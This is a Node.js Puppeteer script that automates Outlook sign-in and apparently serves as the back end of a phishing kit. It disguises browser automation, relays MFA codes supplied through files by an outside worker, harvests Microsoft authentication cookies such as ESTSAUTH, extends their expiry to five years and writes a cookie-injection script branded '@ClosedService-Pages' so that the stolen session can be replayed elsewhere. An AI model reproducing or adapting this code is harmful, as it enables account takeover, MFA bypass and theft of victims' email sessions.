#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const readline = require('readline');
const crypto = require('crypto');
const puppeteer = require('puppeteer');
const { setTimeout } = require('timers/promises');

const projectRoot = '/Users/mindedjr/Documents/trae_projects/L1mk/MA';

function ensureDir(dirPath) {
    if (!dirPath) return;
    if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });
}

// Unified configuration
const cfg = {
    navTimeoutMs: 60000,
    actionTimeoutMs: 30000,
    humanizeEnabled: true,
    blockResources: true,
    artifactsDir: path.join(projectRoot, 'session_data'), // Use absolute path
    collectArtifactsOnFailure: true,
    requireOwaUserConfig: false,
    challengeTimeoutMs: 180000,
    logLevel: 'info',

    proxyEnabled: false,
    proxyUrl: null,
    ...loadEncryptedConfig(),
    ...loadEnvConfig()
};

function loadEncryptedConfig() {
    if (!process.env.ENC_KEY) return {};
    try {
        const configPath = path.join(projectRoot, '.config.enc');
        const encrypted = fs.readFileSync(configPath, 'utf8');
        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(process.env.ENC_KEY, 'hex'), Buffer.alloc(16, 0));
        const decrypted = decipher.update(encrypted, 'hex', 'utf8') + decipher.final('utf8');
        return JSON.parse(decrypted);
    } catch {
        return {};
    }
}

function loadEnvConfig() {
    return {
        logLevel: process.env.LOG_LEVEL || 'info',
        proxyUrl: process.env.PROXY_URL || null,
        challengeTimeoutMs: Number(process.env.CHALLENGE_TIMEOUT_MS) || 180000
    };
}

function normalizeLogLevel(level) {
    if (!level) return 'info';
    const l = String(level).toLowerCase();
    return ['error', 'warn', 'info', 'debug', 'verbose'].includes(l) ? l : 'info';
}

function shouldLog(currentLevel, targetLevel) {
    const levels = { error: 0, warn: 1, info: 2, debug: 3, verbose: 4 };
    return levels[currentLevel] >= levels[targetLevel];
}

function safeUrl(url) {
    try {
        return url.split('?')[0] || url;
    } catch {
        return url;
    }
}

// This function now only handles saving the final cookies.txt file.
async function fileOperation(type, sessionId, data) {
    switch (type) {
        case 'cookies_txt':
            // Ensure the main artifacts directory exists before writing.
            try {
                fs.mkdirSync(cfg.artifactsDir, { recursive: true });
            } catch {}
            
            const txtFile = path.join(cfg.artifactsDir, `cookies_${sessionId}.txt`);
            fs.writeFileSync(txtFile, data, 'utf8');
            if (shouldLog(cfg.logLevel, 'info')) console.log(`[Save] Saved cookie jar to ${path.basename(txtFile)}`);
            break;
    }
}

// Unified error handler
async function handleError(context, error, sessionId, step) {
    // When an error occurs, just log it to the console. No files will be created.
    console.error(`[${step}] Error:`, error.message);
}

// Unified wait functions
async function waitForFile(filePath, timeoutMs = cfg.challengeTimeoutMs) {
    const deadline = Date.now() + timeoutMs;
    if (shouldLog(cfg.logLevel, 'info')) console.log(`[Wait] Waiting for: ${filePath}`);
    
    while (Date.now() < deadline) {
        try {
            if (fs.existsSync(filePath)) {
                const content = fs.readFileSync(filePath, 'utf8').trim();
                if (content) {
                    fs.unlinkSync(filePath);
                    if (shouldLog(cfg.logLevel, 'info')) console.log(`[Wait] Received: ${content.slice(0, 20)}...`);
                    return content;
                }
            }
        } catch {}
        await setTimeout(1000);
    }
    if (shouldLog(cfg.logLevel, 'warn')) console.log('[Wait] Timeout waiting for file');
    return null;
}

// Browser utilities
function applyFingerprint(page) {
    return page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
        Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
        Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
        window.chrome = { runtime: {} };
        delete navigator.__proto__.webdriver;
    });
}

async function clickAndWait(page, clickPromise) {
    const navPromise = page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: cfg.navTimeoutMs }).catch(() => null);
    await clickPromise;
    await navPromise;
}

// Simplified step runner
async function runStep(page, sessionId, step, fn) {
    const start = Date.now();
    try {
        if (shouldLog(cfg.logLevel, 'info')) console.log(`${step}...`);
        const result = await fn();
        const duration = Date.now() - start;
        if (shouldLog(cfg.logLevel, 'info')) console.log(`${step}: Done (${duration}ms)`);
        return { ok: true, result, duration };
    } catch (error) {
        const duration = Date.now() - start;
        await handleError({ page }, error, sessionId, step);
        return { ok: false, error, duration };
    }
}

// Simplified browser initialization
async function initBrowser(options = {}) {
    const browserOptions = {
        headless: options.headless ? 'new' : false,
        ignoreDefaultArgs: ['--enable-automation'],
        args: [
            '--incognito', '--no-sandbox', '--disable-setuid-sandbox',
            '--disable-dev-shm-usage', '--disable-gpu', '--disable-software-rasterizer',
            '--no-first-run', '--disable-notifications', '--no-default-browser-check',
            '--disable-popup-blocking', '--disable-translate',
            '--disable-blink-features=AutomationControlled', '--max_old_space_size=512'
        ],
        dumpio: true,
        ignoreHTTPSErrors: true,
        defaultViewport: { width: 1280, height: 720 },
        executablePath: options.executablePath || findChromeExecutable()
    };

    if (cfg.proxyUrl) {
        browserOptions.args.push(`--proxy-server=${cfg.proxyUrl}`);
    }

    return puppeteer.launch(browserOptions);
}

function findChromeExecutable() {
    const candidates = [
        process.env.PUPPETEER_EXECUTABLE_PATH,
        ...getSystemChromePaths(),
        ...getCachedChromePaths()
    ].filter(Boolean);
    
    return candidates.find(p => fs.existsSync(p)) || null;
}

function getSystemChromePaths() {
    return [
        '/usr/bin/google-chrome-stable',
        '/usr/bin/google-chrome',
        '/usr/bin/chromium-browser',
        '/usr/bin/chromium'
    ];
}

function getCachedChromePaths() {
    const cacheDir = process.env.PUPPETEER_CACHE_DIR || 
        (process.env.HOME ? path.join(process.env.HOME, '.cache/puppeteer') : path.join(projectRoot, '.cache/puppeteer'));
    const chromeRoot = path.join(cacheDir, 'chrome');
    
    try {
        const versions = fs.readdirSync(chromeRoot)
            .filter(name => fs.statSync(path.join(chromeRoot, name)).isDirectory())
            .sort();
        
        const latest = versions[versions.length - 1];
        if (!latest) return [];
        
        const base = path.join(chromeRoot, latest);
        return [
            path.join(base, 'chrome-linux64', 'chrome'),
            path.join(base, 'chrome-linux', 'chrome'),
            path.join(base, 'chrome'),
            path.join(base, 'chrome.exe'),
            path.join(base, 'chrome-mac', 'Chromium.app', 'Contents', 'MacOS', 'Chromium'),
            path.join(base, 'chrome-mac', 'Google Chrome for Testing.app', 'Contents', 'MacOS', 'Google Chrome for Testing'),
            path.join(base, 'chrome-mac-arm64', 'Google Chrome for Testing.app', 'Contents', 'MacOS', 'Google Chrome for Testing')
        ];
    } catch {
        return [];
    }
}

// Helper to cumulatively collect unique cookies
async function updateCookieJar(page, cookieJar) {
    try {
        const currentCookies = await page.cookies();
        let newCookiesFound = false;
        for (const cookie of currentCookies) {
            const key = `${cookie.name}@${cookie.domain}`;
            if (!cookieJar.has(key)) {
                cookieJar.set(key, cookie);
                newCookiesFound = true;
            }
        }

        // If new cookies were found, re-apply all known cookies to the page context.
        // This is crucial for ensuring they are sent on subsequent navigations.
        if (newCookiesFound) {
            console.log('[CookieJar] New cookies found. Re-applying all cookies to the page.');
            const cookiesToSet = Array.from(cookieJar.values());
            await page.setCookie(...cookiesToSet);
        }

        console.log(`[CookieJar] Updated. Jar now contains ${cookieJar.size} unique cookies.`);
    } catch (error) {
        console.warn(`[CookieJar] Failed to update cookie jar: ${error.message}`);
    }
}

// Simplified MFA handling
const mfaSelectors = {
    inputs: ['input[name="otc"]', 'input[type="tel"]', '#idTxtBx_SAOTCC_OTC', 'input[name="verificationCode"]'],
    submits: ['input[type="submit"]', '#idSIButton9', 'button[type="submit"]']
};

async function handleMFA(page, code) {
    for (const inputSel of mfaSelectors.inputs) {
        const input = await page.$(inputSel);
        if (!input) continue;
        
        await input.type(code, { delay: 100 });
        for (const submitSel of mfaSelectors.submits) {
            const submit = await page.$(submitSel);
            if (submit) {
                await submit.click();
                // Add a 1-second pause to allow the page to process the MFA code
                await setTimeout(1000);
                return true;
            }
        }
    }
    return false;
}

// Main automation class
class OutlookLoginAutomation {
    constructor(options = {}) {
        this.browser = null;
        this.page = null;
        this.context = null;
        this.logLevel = normalizeLogLevel(options.logLevel || 'info');
        this.headless = options.headless !== false;
        this.isClosing = false;
    }

    async init() {
        this.browser = await initBrowser({ headless: this.headless });
        this.context = await this.browser.createBrowserContext();
        this.page = await this.context.newPage();
        
        await this.page.setViewport({ width: 1280, height: 720 });
        this.page.setDefaultTimeout(cfg.actionTimeoutMs);
        this.page.setDefaultNavigationTimeout(cfg.navTimeoutMs);
        
        await applyFingerprint(this.page);
        await this.setupPageInterception();
        
        console.log('Browser initialized');
    }

    async setupPageInterception() {
        if (!cfg.blockResources) return;
        
        await this.page.setRequestInterception(true);
        this.page.on('request', req => {
            const url = req.url();
            const type = req.resourceType();
            
            // Allow specific domains
            if (['sso.godaddy.com', 'wsimg.com', 'iesnare.com', 'cdndex.io'].some(domain => url.includes(domain))) {
                return req.continue();
            }
            
            // Block unnecessary resources
            if (['image', 'font'].includes(type) || 
                ['googletag', 'google-analytics', 'doubleclick'].some(domain => url.includes(domain))) {
                return req.abort();
            }
            
            req.continue();
        });
    }

    async performLogin(email, password, sessionId = null, options = {}) {
        this.email = email; // Store email on the class instance
        const effectiveSessionId = sessionId || Date.now();
        const pauseOnMfa = !!options.pauseOnMfa;
        const challengeDeadlineMs = Date.now() + (options.challengeTimeoutMs || cfg.challengeTimeoutMs);
        const cookieJar = new Map(); // The cookie jar to collect all unique cookies.

        try {
            console.log(`Starting login for: ${email}`);

            // Navigate to Outlook
            await runStep(this.page, effectiveSessionId, 'Navigating to Outlook', async () => {
                await this.page.goto('https://outlook.office.com', { waitUntil: 'domcontentloaded' });
            });

            // Email input
            await runStep(this.page, effectiveSessionId, 'Entering email', async () => {
                await this.page.waitForSelector('input[type="email"]');
                await this.page.type('input[type="email"]', email);
            });

            await runStep(this.page, effectiveSessionId, 'Clicking Next', async () => {
                await this.page.click('#idSIButton9');
            });

            // Post-email state verification
            let postEmailState = 'POST_EMAIL';
            for (let i = 0; i < 3; i++) {
                const outcome = await runStep(this.page, effectiveSessionId, `Verifying state after email`, async () => {
                    const result = await this.page.waitForFunction(
                        (sel) => {
                            const isVisible = (element) => element && element.offsetParent !== null;
                            const pageText = document.body.innerText;
                            // Priority 1: "Work or School" prompt
                            if (isVisible(document.querySelector(sel.workOrSchool))) return { state: 'WORK_OR_SCHOOL' };
                            // Priority 2: "Username incorrect" error
                            if (pageText.includes(sel.usernameErrorText)) return { state: 'USERNAME_ERROR' };
                            // Priority 3: Password input field
                            if (isVisible(document.querySelector(sel.passwordInput))) return { state: 'PASSWORD_INPUT' };
                            // Priority 4: MFA prompt
                            if (document.querySelector(sel.mfaInput)) return { state: 'MFA_PROMPT' };
                            return false;
                        },
                        { timeout: 10000 },
                        {
                            workOrSchool: '#aadTile',
                            usernameErrorText: 'This username may be incorrect',
                            passwordInput: 'input[type="password"]',
                            mfaInput: 'input[name="otc"], input[type="tel"]'
                        }
                    );
                    return await result.jsonValue();
                });

                postEmailState = outcome.result.state;

                if (postEmailState === 'WORK_OR_SCHOOL') {
                    await runStep(this.page, effectiveSessionId, 'Clicking "Work or school account"', async () => {
                        await this.page.click('#aadTile');
                        await setTimeout(1500);
                    });
                } else if (postEmailState === 'PASSWORD_INPUT' || postEmailState === 'MFA_PROMPT') {
                    // If we see the password field or an MFA prompt, our work in the post-email race is done.
                    break;
                } else if (postEmailState === 'USERNAME_ERROR') {
                    throw new Error('Login failed: This username may be incorrect.');
                } else {
                    throw new Error(`Unhandled state after email: ${postEmailState}`);
                }
            }

            if (postEmailState !== 'PASSWORD_INPUT') {
                throw new Error('Could not reach password input step.');
            }

            // Password input
            await runStep(this.page, effectiveSessionId, 'Entering password', async () => {
                // Read the password from the file
                const passwordFilePath = path.join(projectRoot, 'password.txt');
                if (!fs.existsSync(passwordFilePath)) {
                    throw new Error(`Password file not found at: ${passwordFilePath}`);
                }
                const filePassword = fs.readFileSync(passwordFilePath, 'utf8').trim();

                // Use the password from the file
                await this.page.type('input[type="password"]', filePassword);
                await this.page.click('#idSIButton9');
                // Per your instruction, removed waitForNavigation and added a short delay.
                await setTimeout(1500);
                await updateCookieJar(this.page, cookieJar); // Collect cookies after password submission
            });

            // Final login check
            const loginResult = await this.checkLoginSuccess(effectiveSessionId, cookieJar, pauseOnMfa, challengeDeadlineMs);
            
            if (loginResult.success) {
                console.log('✅ Login successful');
                return true;
            }
            
            throw new Error('Login verification failed');
            
        } catch (error) {
            await handleError(this, error, effectiveSessionId, 'performLogin');
            return false;
        }
    }

    async checkLoginSuccess(sessionId, cookieJar, pauseOnMfa, challengeDeadlineMs, attempt = 0) {
        console.log(`Checking page after password (Attempt ${attempt + 1})...`);

        if (attempt > 5) { // Safety break to prevent infinite loops
            throw new Error('Login failed: Exceeded maximum attempts on the post-login page.');
        }



        const successPromise = this.page.waitForSelector('div[aria-label="Outlook"], div[aria-label="Mail"] ', { timeout: 45000 })
            .then(() => 'SUCCESS');

        const staySignedInPromise = this.page.waitForFunction(
            () => {
                const textFound = document.body.innerText.includes('Stay signed in?');
                const buttonFound = document.querySelector('#idSIButton9');
                return textFound && buttonFound;
            },
            { timeout: 45000 }
        ).then(() => 'STAY_SIGNED_IN');

        const mfaPromise = this.page.waitForSelector('input[name="otc"], input[type="tel"]', { timeout: 45000 })
            .then(() => 'MFA_PROMPT');

        const wrongPasswordPromise = this.page.waitForFunction(
            () => {
                const bodyText = document.body.innerText;
                return bodyText.includes('incorrect password') || 
                       bodyText.includes('password is incorrect') ||
                       bodyText.includes('That code didn\'t work') ||
                       bodyText.includes('code you entered isn\'t correct');
            },
            { timeout: 45000 }
        ).then(() => 'WRONG_PASSWORD');

        const winner = await Promise.race([
            staySignedInPromise,
            mfaPromise,
            wrongPasswordPromise,
            successPromise
        ]);

        console.log(`Result: ${winner}`);

        switch (winner) {
            case 'SUCCESS':
                console.log('Login successful, inbox found.');
                // --- NEW: Capture all cookies using the Chrome DevTools Protocol ---
                console.log('[CDP] Capturing all network cookies...');
                const cdpSession = await this.page.target().createCDPSession();
                const { cookies } = await cdpSession.send('Network.getAllCookies');
                await cdpSession.detach();

                // --- NEW: Filter for only the essential cookies from the VPS log ---
                const essentialNames = [
                    'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
                    'buid', 'fpc', 'esctx', 'x-ms-gateway-slice', 'stsservicecookie',
                    'AADSSO', 'SSOCOOKIEPULLED', 'brcap', 'wlidperf'
                ];
                const essentialCookies = cookies.filter(c => essentialNames.includes(c.name));
                console.log(`[CDP] Captured ${cookies.length} cookies, filtered down to ${essentialCookies.length} essential cookies.`);

                // Check if we have the required auth cookies before saving.
                const hasAuthCookie = essentialCookies.some(c => c.name.includes('ESTSAUTH'));

                if (hasAuthCookie) {
                    await this.saveMicrosoftCookies(this.page, this.email, sessionId);
                } else {
                    console.log('Login was successful, but no ESTSAUTH cookie was found. Not saving cookies.');
                }

                return { success: true };

            case 'STAY_SIGNED_IN':
                console.log('Found "Stay Signed In", clicking Yes and waiting for 2 seconds...');
                await this.page.click('#idSIButton9');
                await setTimeout(800); // User-specified -second wait
                await updateCookieJar(this.page, cookieJar); // Grab cookies after the wait
                return this.checkLoginSuccess(sessionId, cookieJar, pauseOnMfa, challengeDeadlineMs, attempt + 1);

            case 'MFA_PROMPT':
                console.log('MFA prompt found.'); // Announce for the worker
                fs.writeFileSync(path.join(cfg.artifactsDir, `mfa_prompt_${sessionId}.status`), 'true');
                await updateCookieJar(this.page, cookieJar); // Collect cookies before waiting

                if (pauseOnMfa) {
                    // This is for local debugging and won't be used by the worker
                    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
                    await new Promise(resolve => rl.question('[MFA] Manual input required. Press Enter when done...', resolve));
                    rl.close();
                } else {
                    // The worker runs us from the parent session_data directory.
                    const mfaFile = `mfa_${sessionId}.txt`;
                    const code = await waitForFile(mfaFile, challengeDeadlineMs - Date.now());
                    if (code) {
                        await handleMFA(this.page, code);
                    } else {
                        throw new Error('MFA code was not provided in time.');
                    }
                }
                // After handling MFA, we must re-run the race to see what state we land in.
                return this.checkLoginSuccess(sessionId, cookieJar, pauseOnMfa, challengeDeadlineMs);

            case 'WRONG_PASSWORD':
                // The password was incorrect. Report the final status and allow the script to exit naturally.
                console.log(JSON.stringify({ status: 'failed', error: 'Password was incorrect.' }));
                await setTimeout(3000); // 3-second pause for user to see the state if in headful mode.
                await this.close();
                // By returning, we let the main execution block handle the process exit.
                return { success: false, reason: 'WRONG_PASSWORD' };
            
            default:
                throw new Error(`Login failed due to an unknown state: ${winner}`);
        }
    }

    async saveMicrosoftCookies(page, email = null, providedSessionId = null) {
        const cfg = { artifactsDir: 'session_data' }; // Minimal config for this function
        try {
            console.log('\n🍪 Using your custom VPS cookie saving logic...');
            console.log('🍪 Collecting 13 essential Microsoft authentication cookies...');

            let allCookies = [];
            try {
                const client = await page.target().createCDPSession();
                const { cookies: cdpCookies } = await client.send('Network.getAllCookies');
                allCookies = (cdpCookies || []).map(c => ({
                    name: c.name,
                    value: c.value,
                    domain: c.domain,
                    path: c.path || '/',
                    expires: c.expires,
                    secure: !!c.secure,
                    session: !!c.session,
                    sameSite: c.sameSite || 'None',
                    httpOnly: !!c.httpOnly
                }));
                await client.detach();
                console.log(`📦 Collected ${allCookies.length} cookies via CDP`);
            } catch (e) {
                console.warn('CDP cookie collection failed, falling back to page.cookies()');
                allCookies = await page.cookies();
            }

            const cookieMap = new Map();
            for (const cookie of allCookies) {
                const cookieKey = `${cookie.name}|${cookie.domain}|${cookie.path || '/'}`;
                if (!cookieMap.has(cookieKey) || (cookie.expires > 0 && cookie.expires > (cookieMap.get(cookieKey).expires || 0))) {
                    cookieMap.set(cookieKey, cookie);
                }
            }

            const essentialNames = [
                'ESTSAUTH','ESTSAUTHPERSISTENT','buid','fpc','stsservicecookie','x-ms-gateway-slice',
                'luat','SuiteServiceProxyKey','OWAAppIdType','MSPAuth','MSPOK','rtFa'
            ];
            const filtered = [];
            const seen = new Set();
            const pushCookie = (c) => {
                const key = `${c.name}|${c.domain}|${c.path || '/'}`;
                if (seen.has(key)) return;
                seen.add(key);
                if (c.expires === -1 || !c.expires || c.session) {
                    c.expires = Math.floor(Date.now() / 1000) + (5 * 365 * 24 * 60 * 60);
                    c.session = false;
                } else {
                    const fiveYearsFromNow = Math.floor(Date.now() / 1000) + (5 * 365 * 24 * 60 * 60);
                    if (c.expires < fiveYearsFromNow) c.expires = fiveYearsFromNow;
                }
                c.secure = true;
                c.sameSite = 'None';
                if (c.domain && !c.domain.startsWith('.')) c.domain = '.' + c.domain.replace(/^\.+/, '');
                filtered.push(c);
            };

            for (const name of essentialNames) {
                for (const [, c] of cookieMap) {
                    if (c.name === name) pushCookie(c);
                    if (filtered.length >= 13) break;
                }
                if (filtered.length >= 13) break;
            }
            if (filtered.length < 13) {
                for (const [, c] of cookieMap) {
                    if (c.name && c.name.startsWith('esctx-')) pushCookie(c);
                    if (filtered.length >= 13) break;
                }
            }
            
            const hasEstsAuth = filtered.some(c => c.name === 'ESTSAUTH' || c.name === 'ESTSAUTHPERSISTENT');
            if (!hasEstsAuth) {
                 for (const [, c] of cookieMap) {
                    if (c.name === 'ESTSAUTH' || c.name === 'ESTSAUTHPERSISTENT') {
                        pushCookie(c);
                        break; 
                    }
                }
            }

            const essentialCookies = filtered.slice(0, Math.min(filtered.length, 13));
            console.log(`📦 Filtered down to ${essentialCookies.length} essential cookies using your logic.`);

            const hasRequiredCookie = essentialCookies.some(c => c.name === 'ESTSAUTH' || c.name === 'ESTSAUTHPERSISTENT');
            if (!hasRequiredCookie) {
                throw new Error('❌ STRICT MODE (from your script): Session missing required ESTSAUTH/ESTSAUTHPERSISTENT cookie.');
            }

            const sessionDir = path.join(__dirname, cfg.artifactsDir || 'session_data');
            ensureDir(sessionDir);

            const sessionId = providedSessionId || Date.now();
            const sessionTimestamp = new Date().toISOString();
            const sessionEmail = email || 'unknown';

            const sessionInjectScript = path.join(sessionDir, `inject_session_${sessionId}.js`);
            
            const sessionScriptContent = `
// @ClosedService-Pages Session Cookies 🍪 
// @ClosedService-Pages Auto-generated on ${sessionTimestamp}
// @ClosedService-Pages Email: ${sessionEmail}
// @ClosedService-Pages Cookies: ${essentialCookies.length} 

(function() {
    console.log('🚀 Injecting ${essentialCookies.length} Microsoft cookies for: ${sessionEmail}');
    const cookies = ${JSON.stringify(essentialCookies, null, 4)};
    let injected = 0;
    cookies.forEach(cookie => {
        try {
            let cookieStr = cookie.name + '=' + cookie.value + ';';
            cookieStr += 'domain=' + cookie.domain + ';';
            cookieStr += 'path=' + cookie.path + ';';
            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
            if (cookie.secure) cookieStr += 'secure;';
            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';
            document.cookie = cookieStr;
            injected++;
        } catch (e) { console.warn('Failed to inject cookie:', cookie.name, e.message); }
    });
    console.log('✅ Successfully injected ' + injected + '/' + ${essentialCookies.length} + ' cookies!');
})();`;

            fs.writeFileSync(sessionInjectScript, sessionScriptContent);
            console.log(`✅ Your script has saved the cookie file to: ${sessionInjectScript}`);

            return { success: true, sessionId, injectionScript: sessionInjectScript, cookieCount: essentialCookies.length };
        } catch (error) {
            console.error('❌ Error in your cookie saving logic:', error.message);
            throw error;
        }
    }

    async close() {
        if (this.isClosing) return;
        this.isClosing = true;
        try {
            if (this.context) await this.context.close();
            else if (this.browser) await this.browser.close();
        } catch {}
    }
}

// Simplified CLI argument parsing
function parseCliArgs(args) {
    const flags = new Set(args.filter(a => a.startsWith('--')));
    const positional = args.filter(a => !a.startsWith('--'));
    
    return {
        email: positional[0] || process.env.EMAIL,
        password: positional[1] || process.env.PASSWORD,
        sessionId: positional[2] || String(Date.now()),
        options: {
            headless: !flags.has('--headful'),
            logLevel: flags.has('--verbose') ? 'verbose' : normalizeLogLevel(process.env.LOG_LEVEL || cfg.logLevel),
            pauseOnMfa: flags.has('--pause-on-mfa'),
            pauseOnChallenge: flags.has('--pause-on-challenge'),
            challengeTimeoutMs: Number(args.find(a => a.startsWith('--challenge-timeout-ms='))?.split('=')[1]) || cfg.challengeTimeoutMs
        }
    };
}

// Main execution
if (require.main === module) {
    (async () => {
        let automation;
        const config = parseCliArgs(process.argv.slice(2));
        
        try {
            if (!config.email || !config.password) {
                console.error('❌ Email and password required');
                process.exit(1);
            }

            automation = new OutlookLoginAutomation({
                headless: config.options.headless,
                logLevel: config.options.logLevel
            });
            
            await automation.init();
            
            const success = await automation.performLogin(config.email, config.password, config.sessionId, {
                pauseOnMfa: config.options.pauseOnMfa,
                pauseOnChallenge: config.options.pauseOnChallenge,
                challengeTimeoutMs: config.options.challengeTimeoutMs
            });

            const finalResult = success 
                ? { status: 'cookies_auth_collected' } 
                : { status: 'failed', error: 'Login failed after running checks.' };

            await automation.close();
            console.log(JSON.stringify(finalResult));
            process.exit(0); // Explicitly exit on success
            
        } catch (error) {
            const finalResult = { status: 'failed', error: error.message };
            if (automation) await automation.close();
            console.log(JSON.stringify(finalResult));
        }
    })();
}

module.exports = { OutlookLoginAutomation };